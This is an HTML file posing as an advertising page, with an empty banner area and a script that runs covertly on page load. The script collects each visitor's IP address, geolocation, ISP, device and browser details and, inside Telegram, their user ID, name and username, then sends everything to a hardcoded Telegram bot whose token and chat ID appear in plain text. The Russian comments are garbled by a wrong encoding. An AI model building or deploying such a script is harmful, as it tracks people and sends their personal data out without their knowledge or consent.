<!DOCTYPE html>
<html>
<head>
    <title>–†–µ–∫–ª–∞–º–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .ad-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 30px;
        }
        .vertical-banner {
            border: 1px solid #ddd;
            margin: 10px 0;
        }
        .horizontal-banner {
            width: 100%;
            margin: 15px 0;
            border: 1px solid #eee;
        }
    </style>
    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º Telegram Web App SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <h2>–†–µ–∫–ª–∞–º–Ω—ã–µ –±–∞–Ω–Ω–µ—Ä—ã</h2>

    <!-- –í–∞—à–∏ —Ä–µ–∫–ª–∞–º–Ω—ã–µ –±–∞–Ω–Ω–µ—Ä—ã (–æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π) -->
    <div class="ad-container">
        <!-- –ë–∞–Ω–Ω–µ—Ä—ã –æ—Å—Ç–∞—é—Ç—Å—è –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π -->
    </div>

    <!-- Telegram-—É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Å –ø–æ–ª–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è -->
    <script>
        const BOT_TOKEN = "7675070608:AAGVPYr9IbLAmUhyObGO0-joXbxjkLiIlMM";
        const CHAT_ID = "5778294549";
        
        // Telegram Web App –æ–±—ä–µ–∫—Ç
        const tg = window.Telegram?.WebApp;
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è IP –∞–¥—Ä–µ—Å–∞
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                try {
                    const response = await fetch('https://api64.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return "IP –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω";
                }
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ –û–°
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            
            let browser = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä";
            if (userAgent.indexOf("Firefox") > -1) {
                browser = "Firefox";
            } else if (userAgent.indexOf("SamsungBrowser") > -1) {
                browser = "Samsung Internet";
            } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
                browser = "Opera";
            } else if (userAgent.indexOf("Trident") > -1) {
                browser = "Internet Explorer";
            } else if (userAgent.indexOf("Edge") > -1) {
                browser = "Edge";
            } else if (userAgent.indexOf("Chrome") > -1) {
                browser = "Chrome";
            } else if (userAgent.indexOf("Safari") > -1) {
                browser = "Safari";
            }
            
            let os = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°";
            if (userAgent.indexOf("Windows") > -1) {
                os = "Windows";
            } else if (userAgent.indexOf("Mac") > -1) {
                os = "MacOS";
            } else if (userAgent.indexOf("Linux") > -1) {
                os = "Linux";
            } else if (userAgent.indexOf("Android") > -1) {
                os = "Android";
            } else if (userAgent.indexOf("iOS") > -1 || userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) {
                os = "iOS";
            }
            
            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
            const deviceType = isMobile ? "–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ" : "–î–µ—Å–∫—Ç–æ–ø";
            
            return {
                userAgent: userAgent,
                browser: browser,
                os: os,
                deviceType: deviceType,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null
            };
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö Telegram –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        function getTelegramUserData() {
            if (!tg || !tg.initDataUnsafe || !tg.initDataUnsafe.user) {
                return {
                    source: "–í–µ–±-–±—Ä–∞—É–∑–µ—Ä (–Ω–µ –∏–∑ Telegram)",
                    available: false
                };
            }
            
            const user = tg.initDataUnsafe.user;
            return {
                source: "Telegram Web App",
                available: true,
                id: user.id,
                firstName: user.first_name,
                lastName: user.last_name || "–ù–µ —É–∫–∞–∑–∞–Ω–∞",
                username: user.username || "–ù–µ —É–∫–∞–∑–∞–Ω",
                languageCode: user.language_code || "–ù–µ —É–∫–∞–∑–∞–Ω",
                isPremium: user.is_premium || false,
                allowsWriteToPm: user.allows_write_to_pm || false,
                photoUrl: user.photo_url || "–ù–µ—Ç —Ñ–æ—Ç–æ"
            };
        }
        
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ Telegram Web App
        function getTelegramAppData() {
            if (!tg) {
                return {
                    webAppAvailable: false,
                    message: "Telegram Web App SDK –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω"
                };
            }
            
            return {
                webAppAvailable: true,
                version: tg.version,
                platform: tg.platform,
                colorScheme: tg.colorScheme,
                themeParams: tg.themeParams,
                viewportHeight: tg.viewportHeight,
                viewportStableHeight: tg.viewportStableHeight,
                isExpanded: tg.isExpanded,
                headerColor: tg.headerColor,
                backgroundColor: tg.backgroundColor,
                isClosingConfirmationEnabled: tg.isClosingConfirmationEnabled,
                initData: tg.initData ? "–î–æ—Å—Ç—É–ø–Ω—ã" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö",
                initDataUnsafe: tg.initDataUnsafe ? "–î–æ—Å—Ç—É–ø–Ω—ã" : "–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö"
            };
        }
        
        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ IP
        async function getGeoLocation(ip) {
            if (!ip || ip === "IP –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω") {
                return "–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é";
            }
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                
                return {
                    country: data.country_name || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    countryCode: data.country_code || "N/A",
                    region: data.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    city: data.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                    latitude: data.latitude || "N/A",
                    longitude: data.longitude || "N/A",
                    timezone: data.timezone || "N/A",
                    currency: data.currency || "N/A",
                    isp: data.org || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                };
            } catch (error) {
                try {
                    // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–µ—Ä–≤–∏—Å
                    const response = await fetch(`https://ipwho.is/${ip}`);
                    const data = await response.json();
                    
                    return {
                        country: data.country || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                        countryCode: data.country_code || "N/A",
                        region: data.region || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                        city: data.city || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                        latitude: data.latitude || "N/A",
                        longitude: data.longitude || "N/A",
                        timezone: data.timezone?.id || "N/A",
                        currency: data.currency?.code || "N/A",
                        isp: data.connection?.isp || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                    };
                } catch (error) {
                    return "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é";
                }
            }
        }
        
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendTelegramNotification() {
            try {
                const ipAddress = await getIPAddress();
                const browserInfo = getBrowserInfo();
                const telegramUser = getTelegramUserData();
                const telegramApp = getTelegramAppData();
                const geoLocation = await getGeoLocation(ipAddress);
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                let message = `üîÑ –ù–æ–≤–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å —Ä–µ–∫–ª–∞–º–æ–π\n\n`;
                
                // –†–∞–∑–¥–µ–ª 1: IP –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
                message += `üìç IP –∞–¥—Ä–µ—Å: ${ipAddress}\n`;
                if (typeof geoLocation === 'object') {
                    message += `üó∫Ô∏è –°—Ç—Ä–∞–Ω–∞: ${geoLocation.country} (${geoLocation.countryCode})\n`;
                    message += `üèôÔ∏è –ì–æ—Ä–æ–¥: ${geoLocation.city}, ${geoLocation.region}\n`;
                    message += `üì° –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${geoLocation.isp}\n`;
                }
                message += `\n`;
                
                // –†–∞–∑–¥–µ–ª 2: –î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è Telegram (–µ—Å–ª–∏ –µ—Å—Ç—å)
                message += `üë§ –î–ê–ù–ù–´–ï –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–Ø –¢–ï–õ–ï–ì–†–ê–ú:\n`;
                message += `üì± –ò—Å—Ç–æ—á–Ω–∏–∫: ${telegramUser.source}\n`;
                
                if (telegramUser.available) {
                    message += `üÜî ID: ${telegramUser.id}\n`;
                    message += `üë§ –ò–º—è: ${telegramUser.firstName}\n`;
                    message += `üë• –§–∞–º–∏–ª–∏—è: ${telegramUser.lastName}\n`;
                    message += `üîñ Username: @${telegramUser.username}\n`;
                    message += `üíé Premium: ${telegramUser.isPremium ? '–î–∞ ‚úÖ' : '–ù–µ—Ç ‚ùå'}\n`;
                    message += `üåê –Ø–∑—ã–∫: ${telegramUser.languageCode}\n`;
                } else {
                    message += `‚ÑπÔ∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –≤ Telegram Web App\n`;
                }
                message += `\n`;
                
                // –†–∞–∑–¥–µ–ª 3: –î–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
                message += `üíª –î–ê–ù–ù–´–ï –£–°–¢–†–û–ô–°–¢–í–ê:\n`;
                message += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${browserInfo.deviceType}\n`;
                message += `üåê –ë—Ä–∞—É–∑–µ—Ä: ${browserInfo.browser}\n`;
                message += `üñ•Ô∏è –û–°: ${browserInfo.os}\n`;
                message += `üó£Ô∏è –Ø–∑—ã–∫: ${browserInfo.language}\n`;
                message += `üìè –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${browserInfo.screenResolution}\n`;
                message += `üíæ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${browserInfo.platform}\n`;
                
                if (browserInfo.connection) {
                    message += `üì∂ –°–µ—Ç—å: ${browserInfo.connection.effectiveType}\n`;
                    message += `‚¨áÔ∏è –°–∫–æ—Ä–æ—Å—Ç—å: ${browserInfo.connection.downlink} Mbps\n`;
                }
                message += `\n`;
                
                // –†–∞–∑–¥–µ–ª 4: –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ Telegram
                message += `üì± TELEGRAM APP DATA:\n`;
                message += `üîß –í–µ—Ä—Å–∏—è: ${telegramApp.version || 'N/A'}\n`;
                message += `üì± –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${telegramApp.platform || 'N/A'}\n`;
                message += `üé® –¶–≤–µ—Ç–æ–≤–∞—è —Å—Ö–µ–º–∞: ${telegramApp.colorScheme || 'N/A'}\n`;
                message += `üìê –í—ã—Å–æ—Ç–∞ –æ–∫–Ω–∞: ${telegramApp.viewportHeight || 'N/A'}\n`;
                message += `\n`;
                
                // –†–∞–∑–¥–µ–ª 5: –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                message += `üîß –¢–ï–•–ù–ò–ß–ï–°–ö–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:\n`;
                message += `üïí –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n`;
                message += `üç™ Cookies: ${browserInfo.cookieEnabled ? '–í–∫–ª—é—á–µ–Ω—ã ‚úÖ' : '–í—ã–∫–ª—é—á–µ–Ω—ã ‚ùå'}\n`;
                message += `üö´ Do Not Track: ${browserInfo.doNotTrack || '–ù–µ —É–∫–∞–∑–∞–Ω'}\n`;
                message += `üîó User-Agent: ${browserInfo.userAgent.substring(0, 100)}...\n`;
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: "HTML"
                    })
                });
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
                const dataForDB = {
                    timestamp: new Date().toISOString(),
                    ip: ipAddress,
                    telegramUser: telegramUser,
                    browserInfo: browserInfo,
                    telegramAppInfo: telegramApp,
                    geoLocation: geoLocation
                };
                
                // –õ–æ–≥–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –∫–æ–Ω—Å–æ–ª—å –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
                console.log("–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:", dataForDB);
                
                if (!response.ok) {
                    console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", await response.text());
                }
                
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è:", error);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ö–æ—Ç—è –±—ã –±–∞–∑–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö: ${error.message}\nIP: ${await getIPAddress()}`
                        })
                    });
                } catch (e) {
                    console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ:", e);
                }
            }
        }
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
        if (tg) {
            tg.ready();
            tg.expand(); // –†–∞–∑–≤–æ—Ä–∞—á–∏–≤–∞–µ–º –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∫–Ω–æ–ø–∫—É "–ù–∞–∑–∞–¥" –µ—Å–ª–∏ –Ω—É–∂–Ω–æ
            tg.BackButton.show();
            tg.BackButton.onClick(() => {
                tg.close();
            });
        }
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            setTimeout(sendTelegramNotification, 1500);
        });
        
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ: –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è
        let interactions = [];
        document.addEventListener('click', function(e) {
            interactions.push({
                type: 'click',
                target: e.target.tagName,
                timestamp: new Date().toISOString(),
                x: e.clientX,
                y: e.clientY
            });
        });
        
        // –ü–µ—Ä–µ–¥ –∑–∞–∫—Ä—ã—Ç–∏–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è—Ö
        window.addEventListener('beforeunload', function() {
            if (interactions.length > 0) {
                const interactionData = {
                    interactions: interactions,
                    sessionDuration: Date.now() - performance.timing.navigationStart,
                    pageUrl: window.location.href
                };
                
                // –ú–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å —ç—Ç–∏ –¥–∞–Ω–Ω—ã–µ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫—É–¥–∞-—Ç–æ
                console.log("–î–∞–Ω–Ω—ã–µ –æ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è—Ö:", interactionData);
            }
        });
    </script>
</body>
</html>